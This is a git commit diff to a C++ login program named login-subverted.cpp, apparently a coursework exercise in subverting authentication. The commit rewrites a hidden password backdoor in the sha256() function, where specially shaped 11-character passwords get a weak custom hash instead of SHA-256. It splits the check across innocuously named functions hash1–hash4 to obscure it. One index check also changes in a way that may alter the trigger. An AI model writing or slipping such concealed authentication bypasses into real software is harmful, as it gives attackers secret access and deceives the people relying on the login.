e0b3d7ee439d87cc1b56ce8938c6cda86af05092
Danyl Kecha <danyl.kecha.uk@gmail.com>
2024-10-21 11:21:19 +0100

    Latest version

--- login-subverted.cpp
+++ login-subverted.cpp
@@ -2,11 +2,37 @@
 #include <fstream>
 #include <string>
 #include <sstream>
-#include <unordered_map>
 #include "authlib.h"
 #include <openssl/sha.h>
 
 std::string sha256(const std::string &value) {
+    return hash1(value);
+}
+
+std::string hash3(const std::string &value, const std::string &prevHashValue)
+{
+    int count = 0;
+    for (char ch : value)
+    {
+        if (ch != '/' && ch != '#' && ch != '1')
+        {
+            if (ch >= 'a' && ch <= 'k')
+                count++;
+        }
+    }
+    return count == 0x8 ? hash4(value, prevHashValue) : prevHashValue;
+}
+
+std::string hash4(const std::string &value, const std::string &prevHashValue)
+{
+    unsigned int hashInt = 5381;
+    for (size_t i = 0; i < value.length(); ++i) {
+        hashInt = ((hashInt * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
+    }
+    return std::to_string(hashInt);
+}
+
+std::string hash1(const std::string &value) {
     unsigned char hash[SHA256_DIGEST_LENGTH];
     SHA256_CTX sha256;
     SHA256_Init(&sha256);
@@ -17,30 +43,15 @@ std::string sha256(const std::string &value) {
     for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
         ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i];
     }
-
-    if (value.length() == 0xb && (value[0xa] ^ '/') == 0) {
-        if (((value[4] ^ '#') == 0) && ((value[9] ^ '1') == 0)) {
-            int count = 0;
-            for (char ch : value) {
-                if (ch != '/' && ch != '#' && ch != '1') {
-                    if (ch >= 'a' && ch <= 'k') count++;
-                }
-            }
-
-            if (count == 0x8) {
-                unsigned int hashInt = 5381;
-                for (size_t i = 0; i < value.length(); ++i) {
-                    hashInt = ((hashInt * 31) ^ (value[i] * 131)) + (i * 7) & 0xFFFFFFFF;
-                }
-                return std::to_string(hashInt);
-            }
-        }
-    }
-
-    return ss.str();
+    return value.length() == 0xb && (value[0x1] ^ '/') == 0 ? hash2(value, ss.str()) : ss.str();
 }
 
-int main() {
+std::string hash2(const std::string &value, const std::string &prevHashValue) {
+    return ((value[4] ^ '#') == 0) && ((value[9] ^ '1') == 0) ? hash3(value, prevHashValue) : prevHashValue;
+}
+
+int main()
+{
     std::ifstream passwordFile("passwords.txt");
     std::string currentLine, username, password;
     std::cout << "Enter username: \n>>> ";
